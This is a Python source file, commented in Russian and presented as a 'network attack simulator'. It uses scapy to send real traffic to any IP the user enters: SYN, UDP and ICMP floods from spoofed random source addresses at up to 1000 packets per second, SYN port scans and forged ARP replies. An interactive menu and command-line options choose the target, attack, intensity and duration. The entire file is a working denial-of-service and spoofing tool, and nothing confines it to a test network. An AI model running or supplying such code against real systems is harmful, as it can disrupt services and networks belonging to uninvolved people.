import argparse
import sys
import time
from scapy.all import *
from scapy.layers.inet import TCP, UDP, IP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.arch import get_windows_if_list, get_if_list
import random
import threading
import logging
import os
import re

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class AttackSimulator:
    def __init__(self, target_ip, interface=None):
        self.target_ip = target_ip
        self.interface = interface
        self.stop_attack = False
        self.supported_attacks = {
            'syn_flood': self.syn_flood_attack,
            'udp_flood': self.udp_flood_attack,
            'icmp_flood': self.icmp_flood_attack,
            'port_scan': self.port_scan_attack,
            'arp_spoof': self.arp_spoof_attack
        }
        
    def generate_random_ip(self):
        """Generate a random source IP address"""
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}." \
               f"{random.randint(1, 254)}.{random.randint(1, 254)}"

    def syn_flood_attack(self, duration=10, intensity='medium'):
        """
        SYN Flood attack simulation
        intensity: low (100 packets/s), medium (500 packets/s), high (1000 packets/s)
        """
        packets_per_second = {'low': 100, 'medium': 500, 'high': 1000}[intensity]
        print(f"[*] Начало SYN Flood атаки на {self.target_ip}")
        print(f"[*] Интенсивность: {packets_per_second} пакетов в секунду")
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration and not self.stop_attack:
            batch_start = time.time()
            batch_sent = 0
            
            for _ in range(packets_per_second):
                if self.stop_attack:
                    break
                    
                source_port = random.randint(1024, 65535)
                seq_num = random.randint(1000000000, 2000000000)
                
                # Создаем SYN пакет
                ip_layer = IP(src=self.generate_random_ip(), dst=self.target_ip)
                tcp_layer = TCP(sport=source_port, dport=80, flags="S", seq=seq_num)
                
                try:
                    # Используем L3 отправку без указания интерфейса
                    send(ip_layer/tcp_layer, verbose=False)
                    batch_sent += 1
                    packets_sent += 1
                except Exception as e:
                    print(f"Ошибка отправки SYN пакета: {e}")
            
            # Вычисляем время для паузы
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                time.sleep(1.0 - batch_time)
            
            # Выводим статистику
            elapsed_time = time.time() - start_time
            print(f"\r[*] Отправлено пакетов: {packets_sent}, "
                  f"Прошло времени: {elapsed_time:.1f}s, "
                  f"Пакетов/сек: {batch_sent}", end="")
        
        print(f"\n[*] Атака завершена. Всего отправлено пакетов: {packets_sent}")

    def udp_flood_attack(self, duration=10, intensity='medium'):
        """UDP Flood attack simulation"""
        packets_per_second = {'low': 100, 'medium': 500, 'high': 1000}[intensity]
        print(f"[*] Начало UDP Flood атаки на {self.target_ip}")
        print(f"[*] Интенсивность: {packets_per_second} пакетов в секунду")
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration and not self.stop_attack:
            batch_start = time.time()
            batch_sent = 0
            
            for _ in range(packets_per_second):
                if self.stop_attack:
                    break
                    
                # Создаем UDP пакет с случайными данными
                data = Raw(RandString(size=random.randint(10, 1000)))
                ip_layer = IP(src=self.generate_random_ip(), dst=self.target_ip)
                udp_layer = UDP(sport=random.randint(1024, 65535), 
                              dport=random.randint(1, 65535))
                
                try:
                    send(ip_layer/udp_layer/data, verbose=False)
                    batch_sent += 1
                    packets_sent += 1
                except Exception as e:
                    print(f"Ошибка отправки UDP пакета: {e}")
            
            # Вычисляем время для паузы
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                time.sleep(1.0 - batch_time)
            
            # Выводим статистику
            elapsed_time = time.time() - start_time
            print(f"\r[*] Отправлено пакетов: {packets_sent}, "
                  f"Прошло времени: {elapsed_time:.1f}s, "
                  f"Пакетов/сек: {batch_sent}", end="")
        
        print(f"\n[*] Атака завершена. Всего отправлено пакетов: {packets_sent}")

    def icmp_flood_attack(self, duration=10, intensity='medium'):
        """ICMP Flood (Ping Flood) attack simulation"""
        packets_per_second = {'low': 100, 'medium': 500, 'high': 1000}[intensity]
        print(f"[*] Начало ICMP Flood атаки на {self.target_ip}")
        print(f"[*] Интенсивность: {packets_per_second} пакетов в секунду")
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration and not self.stop_attack:
            batch_start = time.time()
            batch_sent = 0
            
            for _ in range(packets_per_second):
                if self.stop_attack:
                    break
                    
                # Создаем ICMP пакет
                ip_layer = IP(src=self.generate_random_ip(), dst=self.target_ip)
                icmp_layer = ICMP()
                
                try:
                    send(ip_layer/icmp_layer, verbose=False)
                    batch_sent += 1
                    packets_sent += 1
                except Exception as e:
                    print(f"Ошибка отправки ICMP пакета: {e}")
            
            # Вычисляем время для паузы
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                time.sleep(1.0 - batch_time)
            
            # Выводим статистику
            elapsed_time = time.time() - start_time
            print(f"\r[*] Отправлено пакетов: {packets_sent}, "
                  f"Прошло времени: {elapsed_time:.1f}s, "
                  f"Пакетов/сек: {batch_sent}", end="")
        
        print(f"\n[*] Атака завершена. Всего отправлено пакетов: {packets_sent}")

    def port_scan_attack(self, duration=10, intensity='medium'):
        """Port scanning attack simulation"""
        ports_per_second = {'low': 10, 'medium': 50, 'high': 100}[intensity]
        print(f"[*] Начало сканирования портов {self.target_ip}")
        print(f"[*] Интенсивность: {ports_per_second} портов в секунду")
        
        packets_sent = 0
        start_time = time.time()
        
        common_ports = [20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995,
                       1433, 1521, 3306, 3389, 5432, 5900, 8080]
        
        while time.time() - start_time < duration and not self.stop_attack:
            batch_start = time.time()
            batch_sent = 0
            
            for _ in range(ports_per_second):
                if self.stop_attack:
                    break
                    
                target_port = random.choice(common_ports)
                # SYN scan
                ip_layer = IP(dst=self.target_ip)
                tcp_layer = TCP(sport=random.randint(1024, 65535), 
                              dport=target_port, flags="S")
                
                try:
                    send(ip_layer/tcp_layer, verbose=False)
                    batch_sent += 1
                    packets_sent += 1
                except Exception as e:
                    print(f"Ошибка сканирования порта: {e}")
            
            # Вычисляем время для паузы
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                time.sleep(1.0 - batch_time)
            
            # Выводим статистику
            elapsed_time = time.time() - start_time
            print(f"\r[*] Просканировано портов: {packets_sent}, "
                  f"Прошло времени: {elapsed_time:.1f}s, "
                  f"Портов/сек: {batch_sent}", end="")
        
        print(f"\n[*] Сканирование завершено. Всего просканировано портов: {packets_sent}")

    def arp_spoof_attack(self, duration=10, intensity='medium'):
        """ARP Spoofing attack simulation"""
        packets_per_second = {'low': 10, 'medium': 30, 'high': 50}[intensity]
        print(f"[*] Начало ARP Spoofing атаки на {self.target_ip}")
        
        # Получаем MAC-адрес цели
        try:
            target_mac = getmacbyip(self.target_ip)
            if not target_mac:
                print(f"Could not get MAC address for {self.target_ip}")
                return
        except Exception as e:
            print(f"Error getting target MAC address: {e}")
            return
            
        start_time = time.time()
        while time.time() - start_time < duration and not self.stop_attack:
            for _ in range(packets_per_second):
                if self.stop_attack:
                    break
                    
                # Создаем поддельный ARP ответ
                spoofed_mac = "00:11:22:33:44:55"  # Поддельный MAC-адрес
                arp_layer = ARP(op=2, psrc=self.generate_random_ip(),
                              hwsrc=spoofed_mac, pdst=self.target_ip, 
                              hwdst=target_mac)
                
                try:
                    send(arp_layer, verbose=False)
                except Exception as e:
                    print(f"Ошибка отправки ARP пакета: {e}")
                    
            time.sleep(1)

    def start_attack(self, attack_type, duration=10, intensity='medium'):
        """Start the specified attack"""
        if attack_type not in self.supported_attacks:
            print(f"Unsupported attack type. Supported types: {list(self.supported_attacks.keys())}")
            return
            
        self.stop_attack = False
        attack_thread = threading.Thread(
            target=self.supported_attacks[attack_type],
            args=(duration, intensity)
        )
        attack_thread.start()
        return attack_thread

    def stop_current_attack(self):
        """Stop the current attack"""
        self.stop_attack = True

def get_available_interfaces():
    """Get list of available network interfaces"""
    interfaces = []
    try:
        # В Windows используем get_windows_if_list()
        if os.name == 'nt':
            interfaces = get_windows_if_list()
        else:
            # В Unix системах используем get_if_list()
            interfaces = get_if_list()
    except Exception as e:
        print(f"Error getting interfaces: {e}")
    return interfaces

def interactive_menu():
    """Интерактивное меню для конфигурации атаки"""
    print("\n=== Симулятор сетевых атак ===")
    
    # Получаем список доступных интерфейсов
    interfaces = get_available_interfaces()
    
    # Выбор интерфейса
    print("\nДоступные сетевые интерфейсы:")
    for i, iface in enumerate(interfaces, 1):
        if os.name == 'nt':
            print(f"{i}. {iface['name']} ({iface['description']})")
        else:
            print(f"{i}. {iface}")
    
    while True:
        try:
            choice = int(input("\nВыберите номер интерфейса: ")) - 1
            if 0 <= choice < len(interfaces):
                selected_interface = interfaces[choice]['name'] if os.name == 'nt' else interfaces[choice]
                break
            print("Неверный выбор. Попробуйте снова.")
        except ValueError:
            print("Пожалуйста, введите число.")
    
    # Ввод IP-адреса цели
    while True:
        target_ip = input("\nВведите целевой IP-адрес: ")
        # Простая проверка формата IP
        if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
            break
        print("Неверный формат IP-адреса. Используйте формат: xxx.xxx.xxx.xxx")
    
    # Выбор типа атаки
    print("\nДоступные типы атак:")
    attack_types = {
        'syn_flood': 'SYN флуд (TCP)',
        'udp_flood': 'UDP флуд',
        'icmp_flood': 'ICMP флуд (Ping)',
        'port_scan': 'Сканирование портов',
        'arp_spoof': 'ARP-спуфинг'
    }
    attack_keys = list(attack_types.keys())
    for i, (key, description) in enumerate(attack_types.items(), 1):
        print(f"{i}. {description}")
    
    while True:
        try:
            choice = int(input("\nВыберите номер типа атаки: ")) - 1
            if 0 <= choice < len(attack_types):
                attack_type = attack_keys[choice]
                break
            print("Неверный выбор. Попробуйте снова.")
        except ValueError:
            print("Пожалуйста, введите число.")
    
    # Выбор интенсивности
    print("\nВыберите интенсивность атаки:")
    intensities = {
        'low': 'Низкая',
        'medium': 'Средняя',
        'high': 'Высокая'
    }
    intensity_keys = list(intensities.keys())
    for i, (key, description) in enumerate(intensities.items(), 1):
        print(f"{i}. {description}")
    
    while True:
        try:
            choice = int(input("\nВыберите номер интенсивности: ")) - 1
            if 0 <= choice < len(intensities):
                intensity = intensity_keys[choice]
                break
            print("Неверный выбор. Попробуйте снова.")
        except ValueError:
            print("Пожалуйста, введите число.")
    
    # Ввод продолжительности
    while True:
        try:
            duration = int(input("\nВведите продолжительность атаки в секундах: "))
            if duration > 0:
                break
            print("Продолжительность должна быть положительным числом.")
        except ValueError:
            print("Пожалуйста, введите число.")
    
    # Подтверждение параметров
    print("\n=== Конфигурация атаки ===")
    print(f"Интерфейс: {selected_interface}")
    print(f"Целевой IP: {target_ip}")
    print(f"Тип атаки: {attack_types[attack_type]}")
    print(f"Интенсивность: {intensities[intensity]}")
    print(f"Продолжительность: {duration} секунд")
    
    if input("\nНачать атаку? (д/н): ").lower() != 'д':
        print("Атака отменена.")
        return None
    
    return {
        'interface': selected_interface,
        'target': target_ip,
        'attack': attack_type,
        'intensity': intensity,
        'duration': duration
    }

def main():
    if len(sys.argv) > 1:
        # Если переданы аргументы командной строки, используем их
        parser = argparse.ArgumentParser(description='Симулятор сетевых атак')
        parser.add_argument('--target', required=True, help='Целевой IP-адрес')
        parser.add_argument('--interface', help='Сетевой интерфейс')
        parser.add_argument('--attack', required=True, 
                           choices=['syn_flood', 'udp_flood', 'icmp_flood', 
                                   'port_scan', 'arp_spoof'],
                           help='Тип атаки')
        parser.add_argument('--duration', type=int, default=10,
                           help='Продолжительность атаки в секундах')
        parser.add_argument('--intensity', choices=['low', 'medium', 'high'],
                           default='medium', help='Интенсивность атаки')
        args = parser.parse_args()
        config = vars(args)
    else:
        # Иначе используем интерактивное меню
        config = interactive_menu()
        if config is None:
            return

    simulator = AttackSimulator(config['target'], config['interface'])
    
    try:
        print(f"\n[*] Запуск атаки {config['attack']}...")
        print("[*] Нажмите Ctrl+C для остановки атаки")
        attack_thread = simulator.start_attack(config['attack'], 
                                            config['duration'], 
                                            config['intensity'])
        if attack_thread:
            attack_thread.join()
        print("\n[*] Атака завершена")
    except KeyboardInterrupt:
        print("\n[*] Остановка атаки...")
        simulator.stop_current_attack()
        sys.exit(0)

if __name__ == "__main__":
    main()
